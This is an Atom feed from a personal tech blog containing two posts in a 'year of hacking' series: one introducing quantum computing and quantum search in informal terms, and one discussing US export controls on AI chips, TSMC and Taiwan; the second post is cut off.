<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-11-09T00:18:15-07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Jake Mullins</title><subtitle>This is my site where I publish writeups on CTF problems and projects I&apos;m working on.
</subtitle><author><name>Jake Mullins</name></author><entry><title type="html">Week 16 - Dual Use Technologies - Quantum Computing</title><link href="http://localhost:4000/year-of-hacking-0x10" rel="alternate" type="text/html" title="Week 16 - Dual Use Technologies - Quantum Computing" /><published>2024-11-08T00:00:00-07:00</published><updated>2024-11-08T00:00:00-07:00</updated><id>http://localhost:4000/Year-of-Hacking-0x10</id><content type="html" xml:base="http://localhost:4000/year-of-hacking-0x10">&lt;p&gt;Yes I know the  LateX formatting is bad. Pull the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.md&lt;/code&gt; from the repo and drop it into Obsidian IDGAF.&lt;/p&gt;

&lt;p&gt;In the last few posts, I’ve been looking at the Past and Present of dual-use technologies, and how the American government has attempted to control cryptography research and LLM access to forward its national security goals. In the case of cryptography, we saw how the Government’s attempts to restrict the export of academic cryptographic research was ultimately unsuccessful. We then talked about the current efforts of the Biden administration to reshape industrial policy to bring cutting-edge chip manufacturing stateside.&lt;/p&gt;

&lt;p&gt;This week, lets lay the groundwork a technology that has not yet exited the realm of the theoretical. Quantum computing is a proposed improvement to existing computers that would allow computers to solve problems that would be impossible to tackle with the hardware of today. A classical computer like the one you’re using to read this post at its most primitive level a pile of boxes containing either a $0$ or $1$. There is a machine that can look inside the boxes and either spit out new boxes or modify the contents of existing boxes. Each one of these boxes is a &lt;em&gt;bit&lt;/em&gt; and is said to be “binary”, as there are only two possible states for each bit. While all the math that allows computers to work can be abstracted to more than 2 states, like trits or quatrits (or digits!) that have three or four (or ten!) possible states respectively, binary systems have become dominant as their relative simplicity plays well with the messy real world where the values of each box isn’t determined by what’s written on a slip of paper, but are instead the voltage of a copper trace on a microchip. Using a ten-based counting system would mean the computers components must successfully discriminate between ten bands of voltage. In a binary system, the electronic components only have to check if a wire is a high or low voltage.
&lt;img src=&quot;assets/images/blog/week16/Pasted image 20241015151111.png&quot; alt=&quot;assets/images/blog/week16/Pasted\ image\ 20241015151111.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can combine these boxes to represent more than just $0$ or $1$ by essentially stacking these boxes next to each other. With one box, we’d only be able to represent $0$ or $1$. With two boxes, we can represent four different numbers, being $00$, $01$, $10$, and $11$. Each box essentially represents a place value in a base-2 counting system. In our base-10 counting system, we can represent 1,000 different numbers with up to 3 digits, as $10^3 = 1000$, the $3$ coming from the number digits and the $10$ coming from how many states each digit can represent. By converting this to a base-2 system by swapping the $10$ for a $2$, we’re able to see that we can represent 8 numbers with 3 bits: $2^3 = 8$. This exponential relationship can be abstracted to $2^n = V$ where $n$ is the number of bits and $V$ is the number of values that can be represented. Modern computers can do math on integers that use up to 64 bits, which is about 18 gazillion possible numbers. Using some clever tricks we can also represent decimals, called floating point numbers.&lt;/p&gt;

&lt;p&gt;Now that we can represent any number, we need to do something with them. The aforementioned theoretical machine that compares the contents of the boxes and does operations based on their values is a bastardization of the Turing Machine, a thought experiment purported by famed mathematician (and queer icon) Alan Turing.&lt;/p&gt;

&lt;p&gt;As it turns out, it’s possible to do all the things a modern computer can do by combining only two primitive logic gates: $AND$ and $NOT$. An $AND$ gate takes two inputs and has one output. It only outputs a $1$ if and only if both input 1 AND input 2 are $1$. A $NOT$ gate takes a single output and inverts it. That means it outputs $0$ if and only if the input is $1$ and outputs $1$ if and only if the input is $0$.&lt;/p&gt;

&lt;p&gt;We can plot this out in a helpful “truth table”. For an $AND$ gate, lets call input 1 $i_1$, input 2 $i_2$, and the output $o$:&lt;/p&gt;

&lt;p&gt;| $i_1$ | $i_2$ | $o$ |
| :—- | :—- | :– |
| $0$   | $0$   | $0$ |
| $1$   | $0$   | $0$ |
| $0$   | $1$   | $0$ |
| $1$   | $1$   | $1$ |
And for $NOT$:&lt;/p&gt;

&lt;p&gt;| $i$ | $o$ |
| :– | :– |
| $0$ | $1$ |
| $1$ | $0$ |
These gates can be cleverly combined in a whole bunch of different ways to create build a Turing complete machine! This is pretty fortunate, as we’ve been able to build $AND$s and $NOT$s to be incredibly small, cheap to manufacture, and to have above above-NASA levels of reliability using modern transistors.&lt;/p&gt;

&lt;p&gt;The issue with classical bits is that each bit can only represent a single state. Take a theoretical math function $f$ that takes in eight $0$’s or $1$’s (or a byte of information) and spits out a number between 0 and 1. This would be written as $f({0\ 1}^8)$, with ${0\ 1}^8$ being any combination of $0$ and $1$ Your goal is to find an input that returns exactly $0.7326$, or mathematically find ${0\ 1}^8$ where $f({0\ 1}^8) = 0.7326$. It’s pretty simple to intuit that there are only $2^8$ possible inputs for $f$, so you only need to check $2^8$ or $256$ possible inputs in the worst-case scenario to get the desired input. $256$ is a pretty small number, so you could almost check that many cases by hand, and would be trivial to do with a simple “for” loop in a any programming language.&lt;/p&gt;

&lt;p&gt;However, this starts getting really difficult when dealing with extremely complex problems with gazillions of possible answers, like figuring out the properties of a theoretical protein computationally without deriving them experimentally. This has ground breaking applications in drug discovery and biotech. To simulate a theoretical protein with 1000 amino acids, let’s say you need to calculate 100 different characteristics for each amino acid. This can include attributes like bond length, bond angles, polarity, and electronegativity of each molecule. That means you may need to simulate $100^{1000}$ or $10^{2000}$  possible combinations of attributes to come up with the final shape of a protein. If we can run through 100 combinations a second, or say we through a modern data center with the latest hardware and algorithms, perhaps we can churn out 10 million combinations a second, we would be exhaust all possible combinations in $10^{1993}$ seconds, something like $10^{1886}$ times longer than the estimated heat death of the universe. That’s not &lt;em&gt;exactly&lt;/em&gt; feasible.&lt;/p&gt;

&lt;p&gt;Enter quantum computing. Let’s black-box what the hardware of a quantum computer looks like for this post, and live in the world of mathematics. A way to get around the computational limitation of these problems is to somehow evaluate multiple states at the same time. A good analogy for comparing the difference between classical and quantum algorithms is the problem of solving a maze. This kind of problem can be abstracted into a graph, a favorite data structure of mathematicians and people who actually enjoyed their algorithms class. Each intersection in the maze can be represented as a node in the graph, with potential paths from that node branching off. In a classical implementation, the program might do a depth-first search on the graph, where it traverses as far down in the tree as it can.
&lt;img src=&quot;assets/images/blog/week16/Pasted image 20241011155800.png&quot; alt=&quot;assets/images/blog/week16/Pasted\ image\ 20241011155800&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The maze solving problem has a linear time complexity, meaning that this will take as many iterations as there are nodes in the graph to find the solution, at least in the worst-case scenario. This is represented with big-O notation: $O(n)$. This means that it would take at most $n$ runs of the algorithm to find the best solution. We call this kind of situation “Linear Time” For the rest of this conversation, remember that the biggest advantage of quantum computers is that they can make that $O$ smaller.&lt;/p&gt;

&lt;p&gt;In algorithm analysis, there is a hierarchy of complexity. In the vast majority of cases, especially when the data input size grows, it is much better to run an algorithm that gets the job done in $n$ (linear) iterations than $n^2$ (exponential) iterations. Likewise it is much better to run an algorithm in $\log n$ iterations than one that runs in $n \log n$. The holy grail of course is to run an algorithm in constant time $O(1)$, which takes the same amount of time, regardless of how large the input is. Reducing the computational complexity of certain problems, even going from $O(n^2)$ to $O(n)$, brings them into the realm of the possibility.&lt;/p&gt;

&lt;p&gt;In a theoretical quantum computer, the maze solving problem can be accomplished in $O(\sqrt{n})$ complexity, a “quadratic speedup”. Intuitively, this is a very fast speedup that’s worth pursuing, but the scale of how much faster it is compared to the classical implementation is hard to convey without seeing visually. At five elements, it would take at most 3 ($\sqrt{5} = 2.23$ rounded up $= 3$) iterations of the algorithm before solving the maze.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/blog/week16/Pasted image 20241017063427.png&quot; alt=&quot;assets/images/blog/week16/Pasted\ image\ 20241017063427&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When we zoom out to ten thousand elements, the utility of the speedup is obvious. It would only take a hundred iterations of a quantum depth-first-search algorithm to crawl an entire tree with ten thousand elements!
&lt;img src=&quot;assets/images/blog/week16/Pasted image 20241017063749.png&quot; alt=&quot;assets/images/blog/week16/Pasted\ image\ 20241017063749&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is due to a phenomenon called &lt;em&gt;quantum annealing&lt;/em&gt;. In a classical implementation of a maze-solving Depth First Search algorithm, you only know whether or not you’ve solved the maze. There’s no way for you to “know” how far off you are from finding an optimal solution. Theoretically, each set of conditions you try is just as likely as the next to be the most optimal solution, meaning that the best course of action is to effectively bruteforce the path until you find a solution that works. In a quantum computer, with each iteration you run an algorithm, the “amplitude” or likelihood that your current solution is the optimal one increases and the “amplitude” that other solutions are the solution decreases.&lt;/p&gt;

&lt;p&gt;This image shows a single iteration of a quantum algorithm. Notice that the blue “solution” bar increases in height while the red incorrect bars decrease. Think of it as the blue “correct” solution stealing probability from the red “incorrect” solution. Run enough iterations and you can be almost 100% certain that that blue bar is the most optimal solution.
&lt;img src=&quot;assets/images/blog/week16/Pasted image 20241104194514.png&quot; alt=&quot;assets/images/blog/week16/Pasted\ image\ 20241104194514&quot; /&gt;&lt;/p&gt;

&lt;p&gt;According to the math, a quantum computer can solve any kind of problem that a classical computer can solve, but not necessarily better. The primary learning material I used for this article, &lt;a href=&quot;quantum.country&quot;&gt;quantum.country&lt;/a&gt;, gives the example of searching an ordered list for a value. On a classical computer, we use the “Binary Search” algorithm. This algorithm takes an ordered list, evaluates if the midpoint is higher or lower than the target value, and reruns the algorithm on either the top or bottom half of the list until it finds the target value. This has plenty of applications like database searches, an operation that is done trillions of times a second across the world.
&lt;img src=&quot;assets/images/blog/week16/Pasted image 20241106222853.png&quot; alt=&quot;assets/images/blog/week16/Pasted\ image\ 20241106222853&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This classical search algorithm has $O(\log n)$ complexity, meaning that for every element that in the list, it takes $\log n$ number of iterations to exhaust the search space.&lt;/p&gt;

&lt;p&gt;As we’ll see, quantum computers are not meant to replace classical computers, but instead supplement to help with some very specific problems. That’s not to say that it is &lt;em&gt;impossible&lt;/em&gt; for quantum computers to replace classical computers, but instead &lt;em&gt;impractical&lt;/em&gt;. Remember what I said about AND’s and NOT gates being the building blocks for all the logic used in a classical computer? We &lt;em&gt;can&lt;/em&gt; create those gates in a quantum circuit, which means with enough gates we could fully replicate a computer, with memory, an OS, keyboard inputs etc. In fact, here’s what an AND gate looks like. The inputs on the left are the states of individual qubits. $a$ and $b$ are qubits that are being used in the computation.
&lt;img src=&quot;assets/images/blog/week16/Pasted image 20241108230837.png&quot; alt=&quot;assets/images/blog/week16/Pasted\ image\ 20241108230837&quot; /&gt;
And here’s a Conditional NOT.&lt;/p&gt;

&lt;p&gt;Replacing all classical hardware with quantum hardware does not utilize the technology’s strengths. Let’s examine the Quantum Search Algorithm to exemplify this:&lt;/p&gt;

&lt;h2 id=&quot;the-quantum-search-algorithm&quot;&gt;The Quantum Search Algorithm&lt;/h2&gt;
&lt;p&gt;The Quantum Search Algorithm™ is a search algorithm that plays to a quantum computer’s strengths, reducing the complexity of any search to $O(\sqrt n$). This algorithm works by creating a quantum circuit that can evaluate a solution, which provides a solution vector $\ket{s}$, a starting point $\ket{\psi}$, and a fixed point $\ket{E}$. All of these are “vectors”, or linear combinations of quantum states. We can create a “solver” circuit that evaluates to true when a certain condition is met. We can then run the starting state $\ket{\psi}$ through the solver circuit, then reflect about the fixed point vector $\ket{E}$. The resulting vector $\ket{\psi’}$ is going to be WAY closer to the solution $\ket{s}$. It’s a little difficult to understand, so &lt;a href=&quot;quantum.country&quot;&gt;quantum.country&lt;/a&gt; provided this super sick graphic:
&lt;img src=&quot;assets/images/blog/week16/Pasted image 20241108225141.png&quot; alt=&quot;assets/images/blog/week16/Pasted\ image\ 20241108225141&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Our goal is to move $\ket{\psi}$ as near as possible to $\ket{s}$. By doing these clever reflections, we can guarantee that $\ket{\psi’}$ is significantly closer  to $\ket{s}$ than $\ket{\psi}$ was. The math is really cool, so I absolutely recommend that you go through &lt;a href=&quot;quantum.country&quot;&gt;quantum.country&lt;/a&gt;. I’ve done a lot of learning with a lot of different mediums and subjects, and their combination of Anki-style flashcards embedded directly into the content backed by the expertise to explain complex concepts simply is a pedagogical masterpiece.&lt;/p&gt;

&lt;p&gt;While a useful quantum computer does not yet exist, researchers have been laying the theoretical framework for creating these machines for about three decades. Next time we talk about quantum computing, we’ll discuss how a future quantum computing industry could used as a tool of power by the US Government.&lt;/p&gt;

&lt;h1 id=&quot;music-i-listened-to-this-week-2-months&quot;&gt;Music I listened to this &lt;del&gt;week&lt;/del&gt; 2 months&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://open.spotify.com/track/6XcoiOYiNbIxzpt8WRxq8Z?si=496f90190ecd43e5&quot;&gt;Du Hast&lt;/a&gt; - Rammstein&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://open.spotify.com/track/1tTPC0hsnXq1IGpvWY54JC?si=5b0066650df64eb0&quot;&gt;Kashmir - Remastered&lt;/a&gt; - Reload&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://open.spotify.com/track/0BCEJXmemL21JvNNoOB5TT?si=39e116a423904bbe&quot;&gt;ستو أنا&lt;/a&gt; - أكرام حسني&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://open.spotify.com/track/7jHu1ufEWMeP8RbNMxFpGK?si=662c11b1c2d644e0&quot;&gt;St. James Infirmary&lt;/a&gt; - The Bridge City Sinners&lt;/p&gt;</content><author><name>Jake Mullins</name></author><category term="year-of-hacking" /><category term="cryptography" /><category term="china" /><category term="chips" /><category term="nsa" /><summary type="html">Yes I know the LateX formatting is bad. Pull the .md from the repo and drop it into Obsidian IDGAF.</summary></entry><entry><title type="html">Week 15 - Dual Use Technologies - Chips, China, and AI</title><link href="http://localhost:4000/year-of-hacking-0xf" rel="alternate" type="text/html" title="Week 15 - Dual Use Technologies - Chips, China, and AI" /><published>2024-09-02T00:00:00-06:00</published><updated>2024-09-02T00:00:00-06:00</updated><id>http://localhost:4000/Year-of-Hacking-0xf</id><content type="html" xml:base="http://localhost:4000/year-of-hacking-0xf">&lt;p&gt;This piece is part two of a three-part series on American industrial policy at the cutting edge of technology. This week, we’ll examine the latest moves the US has made to retain its dominance over China in the AI space, particularly in the realm of chips.&lt;/p&gt;

&lt;h1 id=&quot;ai&quot;&gt;AI&lt;/h1&gt;
&lt;p&gt;The American tech sector has seemingly secured dominance in the AI space (as of time of writing). Each of the “Big Seven” American tech companies has their own extremely well-resourced AI-related venture, with some making it a keystone of their business strategy moving forward. Google has Gemini, Amazon has made significant investments into GPUs for AWS EC2 instances and unveiled Amazon Bedrock, Apple has the upcoming Apple Intelligence, Meta has the Llama open-source model suite, Microsoft has made cozy bedfellows with OpenAI and rolled out Copilot, Tesla (well, really Musk) has xAI, and of course Nvidia’s stock graph went nearly vertical by selling them all GPUs.&lt;/p&gt;

&lt;p&gt;GPUs, or Graphical Processing Units, are specialized hardware originally developed for computing the vast matrix multiplications used in graphics processing. A typical CPU in a computer is able to do practically any operation, whereas a GPU can do only a few types of operations, typically elementary matrix operations, thousands of times faster than a CPU by running calculations simultaneously.&lt;/p&gt;

&lt;p&gt;The semiconductor industry was shaken by Nvidia’s meteoric rise to global importance as the demand for GPUs increased. Given Nvidia’s stock price, I’m surprised the company is still running. If I were a senior Nvidia engineer with five years seniority, I would have already sold out and bought a cabin in Wyoming with two big dogs, a horse, an illegally imported 2020 Toyota Hilux, and absolutely no internet connection, so I can never again accidentally see old ISIS beheadings on Twitter in public or asked to be a CTO of a San Francisco-based AI startup by a 19-year old Stanford waitlister from Hungary who doesn’t know how to swing a hammer.
&lt;img src=&quot;https://www.dumpaday.com/wp-content/uploads/2022/02/when-Im-not-telling-people-when-I-win-the-lotto-but-there-will-be-signs.jpg&quot; alt=&quot;Me fr&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Back on topic: China hasn’t simply submitted to an American-led AI landscape. Baidu, China’s Google, has rolled out their own Chatbot named ERNIE 4.0. The Amazon of Asia, Alibaba, has also developed an open-source 110B parameter model called &lt;a href=&quot;https://github.com/QwenLM/Qwen&quot;&gt;Qwen&lt;/a&gt; 1.5. However, Chinese companies lack the GPUs that their American counterparts have in surplus and are unable to manufacture them domestically. While consumer-grade GPUs that slot into a desktop are much smaller and simpler than the server GPUs used in enterprise applications, they can indicate a company’s sophistication and ability to deliver high-end enterprise chips. Nvidia has the best consumer-grade GPUs on the market and is the industry leader in the GPU space. The best of China’s &lt;a href=&quot;https://www.tomshardware.com/pc-components/gpus/chinese-made-gpu-beats-performance-of-10-year-old-integrated-amd-graphics-lingjiu-gp201-hits-mass-production&quot;&gt;domestically produced gaming GPUs&lt;/a&gt; match up to where Nvidia was a full decade ago.&lt;/p&gt;

&lt;p&gt;We’ll return to hardware in a second, but imagine you’re an American policymaker. Perhaps you’re part of the &lt;a href=&quot;https://www.cecc.gov/&quot;&gt;Congressional-Executive Commission on China&lt;/a&gt; and have read &lt;a href=&quot;https://nsc.crawford.anu.edu.au/sites/default/files/publication/nsc_crawford_anu_edu_au/2020-05/transparent_oceans_report_anu_nsc_2020_0.pdf&quot;&gt;this&lt;/a&gt; report from Australian National University that details how the development of data collection and processing facilitated by AI could render the stealth of nuclear-powered ballistic submarines useless, effectively making the ocean transparent. You now have a very provocative and convincing reason to ensure continued American dominance in the AI space that will make any General turn their head.&lt;/p&gt;

&lt;p&gt;You now have two goals to pursue for furthering American dominance in the AI space. You could ensure that the United States is attracting the best AI experts in the world, and you could restrict your adversaries’ access to GPU hardware. Attracting talent is the easy part, especially with plenty of influential people in the tech sector making their dissatisfaction with the visa process for highly skilled workers known. American soft power has resulted in 50 million immigrants calling my country home and bolstering our economy, in turn making the US a more attractive place to emigrate to. The same cannot be said for China, which, despite its population of over 1.4 billion, only has just over &lt;a href=&quot;https://www.intereconomics.eu/contents/year/2022/number/5/article/goodbye-china-what-do-fewer-foreigners-mean-for-multinationals-and-the-chinese-economy.html#footnote-008-backlink&quot;&gt;1.4 million&lt;/a&gt; foreigners, about 600 thousand of that number being from the Special Administrative Regions of Macau and Hong Kong. As far as I’m concerned, my friend in Singapore bought this &lt;a href=&quot;https://www.redbubble.com/i/tank-top/Chappell-4-Prez-by-garfieldstan/163769520.E1H7L&quot;&gt;Chappell Roan&lt;/a&gt; shirt after seeing me wear it in a Discord call for the same reason that the US will never be short of the best AI talent: the US is the center of the world culturally and economically.&lt;/p&gt;

&lt;p&gt;In terms of hardware, American companies still lead the pack. Juggernauts like Nvidia and AMD are years ahead of Chinese products. This leads to the question, “Why don’t the Chinese import GPUs?”. The answer lies in American export controls restricting GPU sales to adversaries. In my &lt;a href=&quot;https://open.substack.com/pub/jakemullins/p/dual-use-technologies-cryptography?r=2qhmwk&amp;amp;utm_campaign=post&amp;amp;utm_medium=web&quot;&gt;previous article&lt;/a&gt;, I discuss the International Traffic in Arms Regulations (ITAR), a set of regulations used by the Government to restrict the export of dual-use technology to further American national security objectives set by the Department of State. Dual-use technologies are items that have both military and civilian use cases. A big chunk of the restricted items in ITAR are listed in the US Munitions List, like aircraft, submarines, training equipment, and ammunition. The Export Administration Regulations (EAR) accomplishes a similar goal but has a broader scope which includes economic goals, not only national security goals. As of yet, ITAR does not contain guidance on anything artificial intelligence related, including the dispersal of models or GPU hardware. The EAR has instead become the instrument used to control AI proliferation. The Department of Commerce recently updated their regulations to ban the export of GPUs past a certain performance threshold to adversaries. This ban affected the Nvidia’s A100 GPU with its measly 19.5 TFLOPS (Tera-Floating point operations per second, basically 19.5 trillion calculations a second) and the H100 with its beefy 67 TFLOPS. Note that these two units were released 34 months apart. In 34 months, Nvidia was able to more than triple the performance of their flagship enterprise product, which is no small task.&lt;/p&gt;

&lt;p&gt;GPUs are just about the most complicated products in semiconductors. Some products like DRAM (Dynamic RAM) are completely commoditized. Despite their simplicity relative to other semiconductor products, DRAM still requires incredibly complex supply chains and niche expertise. Over the last few decades, multiple companies have developed the capability to manufacture RAM profitably and have created a healthy ecosystem that benefits the consumer with plenty of commodity components to choose from. A RAM chip from SK Hynix is essentially the same product as RAM from Micron. If you’re older than 30, you probably remember days when four gigs of RAM sticks costed multiple hundreds of dollars. Now, you can buy 128 gigs worth for the same price thanks to the competition to provide better products. Other sectors, like CPUs, have more complex market dynamics, but also have multiple competitors like Intel, AMD, and various ARM-architecture manufacturers driving forward innovation.
&lt;img src=&quot;https://www.cl.cam.ac.uk/~djg11/socdam-patterns-hls-touchstones/soc-design-patterns/sp2-power/images/DRAM_samsung.png&quot; alt=&quot;Samsung 1-Gbit DDR2 DRAM die&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The GPU space is much different. Nvidia is so far ahead of the curve that it’s almost not worth discussing its competitors. This has been reflected by Nvidia’s stock hitting orbital velocity since Q1 2023 while Intel and AMD, Nvidia’s competitors in the AI space, have seen a decrease in price. Nvidia has the monopoly in GPU chips simply by offering the best performance in the space, capturing 80% of the market in Q4 2023. No one is capable of designing chips like Nvidia.&lt;/p&gt;

&lt;p&gt;This isn’t the whole story. Taiwan Semiconductor Manufacturing Company (TSMC) actually builds the majority of Nvidia’s AI chips. TSMC is the only company on the planet that possesses the ability to manufacture the most advanced leading-edge chips used in everything from iPhones to F-35s. Nvidia uses a “fabless” business model, where they don’t build the chips in-house, only providing their designs to a fab partner like TSMC or Samsung. This business model came about as chip manufacturing became increasingly capital-intensive and required more specialized knowledge. This has allowed Nvidia to focus on designing the best GPU chips without putting forward the capital required to spin up their own fab. Taiwan’s TSMC is a very attractive partner because unlike Intel or Samsung, TSMC doesn’t design anything themselves, removing intellectual property theft from the table. This compartmentalization has won TSMC 62% of the market share in the foundry space, with Korea’s Samsung in a distant second with 13%. The best chemists, physicists, machinists, engineers, and factory managers of Asia are on TSMC’s payroll, making TSMC one of the only places that have the technical experience in running cutting-edge semiconductor tools at scale.&lt;/p&gt;

&lt;p&gt;While TSMC is not state-run, the company has an incredibly close relationship with the Taiwanese Government. The presence of most of the company’s fabrication capacity on the island has thrust Taiwan into global importance. Chinese, Asian, European, and American chips are fabbed on the island, and disruption to this supply chain would be catastrophic. The &lt;a href=&quot;https://www.reuters.com/world/us/us-official-says-chinese-seizure-tsmc-taiwan-would-be-absolutely-devastating-2024-05-08/&quot;&gt;Department of Commerce&lt;/a&gt; projected that a full Chinese takeover of TSMC in Taiwan would increase the cost of chips in the US by 59 percent, which would lead to incredibly high prices attached to final products, not to mention the disruption this hypothetical would cause to national security-critical supply chains. Taiwan has used this leverage to gain support from the world’s democracies as the keystone of the information-age economy. While the US shockingly does not formally recognize Taiwan’s independence to preserve relations with its big red brother and the States’ largest trade partner, the Americans have a long history of selling weapons and training to the Taiwanese. &lt;a href=&quot;https://www.forumarmstrade.org/ustaiwan.html&quot;&gt;Most of this kit as of late&lt;/a&gt; is the kind of weapons and platforms that would be used to fend off an amphibious assault against a &lt;a href=&quot;https://www.csis.org/analysis/unpacking-chinas-naval-buildup&quot;&gt;large naval force&lt;/a&gt; like Switchblade drones, Reaper drones, Patriot missile systems, surface-to-air missiles, and F-16s. While it is impossible to know the future, it seems likely that the United States and her allies in Korea, Japan, and the Philippines as well as the rest of NATO would come to the defense of democratic Taiwan in the event of a full-scale invasion from China. The Taiwanese have cleverly made the island a critical link in the supply chains that run the democracies of the world, and in return, they have received protection from a China that seems to be increasingly possessive of the democratic and independent nation of Taiwan.
&lt;img src=&quot;https://i0.wp.com/theonlinecitizen.s3.ap-northeast-2.amazonaws.com/uploads/2022/12/26204159/tsmc-logo-png-transparent-1-1.png?fit=999%2C500&amp;amp;ssl=1&quot; alt=&quot;TSMC Logo&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We’ve gone over sticks, let’s talk about some carrots. In 2022, Congress passed the &lt;a href=&quot;https://www.congress.gov/bill/117th-congress/house-bill/4346&quot;&gt;CHIPS and Science Act&lt;/a&gt;, a hefty bill that authorizes funding for various federal science agencies and mechanisms to support the domestic manufacture of semiconductors. This bill instructs the Department of Commerce to incentivize investment in bringing every step of the semiconductor value chain stateside, including fabrication, assembly, testing, and packaging. It also provides funding for everything from advanced materials science, infectious disease research, and quantum cryptography, and provides funding for 2 SLS missions to be launched a year until a human mission to Mars is possible. While taking notes on the bill, I wrote, “Pretty sure half of these are fancy flashlights for the physics nerds to play with.”&lt;/p&gt;

&lt;p&gt;The CHIPS and Science Act has made $39 billion available to companies that bring chip manufacturing to the states. During a recent episode of &lt;a href=&quot;https://www.chinatalk.media/p/the-chips-act-and-national-security&quot;&gt;ChinaTalk&lt;/a&gt;, &lt;a href=&quot;https://www.linkedin.com/in/jorschneider/&quot;&gt;Jordan Schneider&lt;/a&gt; discussed the CHIPS act with former director of national security at the CHIPS office &lt;a href=&quot;https://www.linkedin.com/in/benjamin-schwartz-b42a805/&quot;&gt;Benjamin Schwarz&lt;/a&gt;. Ben discussed a small deal worth about $35 million with defense contractor BAE to produce a Monolithic Microwave Integrated Circuit (MMIC) chip that is vital to the electronic warfare systems on the F-35 platforms. He described it as a “smart use of U.S. government funding”, as a small injection of cash was able to solve the shortage of these critical components to our most dominant systems.&lt;/p&gt;

&lt;p&gt;At a much larger scale, the CHIPS office announced $6.6 billion in grants to TSMC to bring manufacturing to Phoenix, Arizona. Currently, TSMC plans to build three large fabs producing both four nanometer and two nanometer nodes. Once completed and running, this will be the first time in decades that the United States domestically produces the leading-edge chips. I’ve seen these buildings in person, and their scale is absolutely massive. While the water-conscious reader might recoil at the thought of setting up one of the most water-intensive modern manufacturing processes in dry Phoenix, TSMC has shot for a &lt;a href=&quot;https://pr.tsmc.com/english/news/3122&quot;&gt;90%&lt;/a&gt; water recycling rate. Phoenix is also uniquely positioned to hold this specialized and high-skilled industry, as it has seen a population boom instead of decline after the pandemic, already has a highly skilled population in both engineering and software, has the largest university in the country from ASU that would be able to fulfill the demand for semiconductor technicians, it has relatively cheap skilled and unskilled labor, and its geographic proximity to the ports of California makes importing and exporting overseas that much easier.
&lt;img src=&quot;https://www.tsmc.com/static/abouttsmcaz/img/about_arizona.jpg&quot; alt=&quot;Phoenix Fab&quot; /&gt;&lt;/p&gt;

&lt;p&gt;While this investment can be read as a move by the American Government to wean itself off of the Taiwanese chip industry so as not to get pulled into a war in the event of a Chinese invasion of Taiwan, my opinion is that this helps Taiwanese independence in the critical near future when China is most likely to invade. TSMC, and thus the Taiwanese Government, has shown its willingness to work with the United States in critical industries, and is likely to use this to pursue the same level of allyship that the United States give to Japan and South Korea. Some estimates say that the US is &lt;a href=&quot;https://arstechnica.com/tech-policy/2023/11/nvidia-ceo-us-chip-independence-may-take-20-years-to-achieve/&quot;&gt;two to three decades&lt;/a&gt; away from complete chip independence, whereas the &lt;a href=&quot;https://media.defense.gov/2023/Apr/24/2003205865/-1/-1/1/07-AMONSON%20%26%20EGLI_FEATURE%20IWD.PDF&quot;&gt;some of the most well-informed estimates for a cross-strait war timeline&lt;/a&gt; posit that an full-scale invasion of Taiwan is possible as soon as 2027 to 2030, in the first few years after the 21st National Congress of the Chinese Communist Party. Taiwan is walking a balance between ensuring that they can count on American support in the event of an invasion by allowing the Americans to develop a copy of their biggest bargaining chip.&lt;/p&gt;

&lt;p&gt;By restricting China’s access to the best American-Taiwanese hardware and bringing semiconductor manufacturing stateside, the US government has ensured American dominance AI and supported democracy in the Pacific, at least for the foreseeable future. There are chips slipping into China through direct smuggling or by passing through shell companies, but this has always been an issue with export regulation. Given &lt;a href=&quot;https://www.fbi.gov/file-repository/china-exec-summary-risk-to-corporate-america-2019.pdf&quot;&gt;China’s recent history of intellectual property theft&lt;/a&gt;, it’s nearly guaranteed that some chips are already in the hands of a darling defense contractor in China being reverse engineered. Too bad the best Chinese engineers are already designing the next Nvidia chip in Palo Alto to be sold directly to American Big Tech.&lt;/p&gt;

&lt;p&gt;But what about using the models that have already been built? If I were an operative running an influence campaign to try to swing the American election this year, I would simply use ChatGPT. It turns out, the US has taken actions against this vector as well. OpenAI kickstarted the AI revolution by releasing ChatGPT on November 30th, 2022, bringing life to a stagnant Silicon Valley focused on SaaS vaporware and Web3. It’s become known to the tech community that Microsoft has had a roughly 49% stake in OpenAI since 2019, a bet that brought Microsoft back to the cutting edge after more than a decade of UX updates to Windows and a cloud business that has the same capability set as the three other hyperscalers. Generative AI has complemented Microsoft’s existing suite extraordinarily well, and the market seems to know this. The stock price has increased by north of 30% since Copilot was announced as Microsoft has leaned into AI. Anecdotally, everyone I know at Microsoft is interested in either AI or security. Microsoft also has incredibly deep relations with the US Government, capturing &lt;a href=&quot;https://ccianet.org/news/2021/09/new-study-shows-microsoft-holds-85-market-share-in-u-s-public-sector-productivity-software/&quot;&gt;85% of the public sector office software market&lt;/a&gt;, and providing Azure cloud services to the Government. While OpenAI remains independent, that 49% Microsoft stake has probably come with some gentle suggestions for business strategies, like opening the company to the biggest customer in the country.&lt;/p&gt;

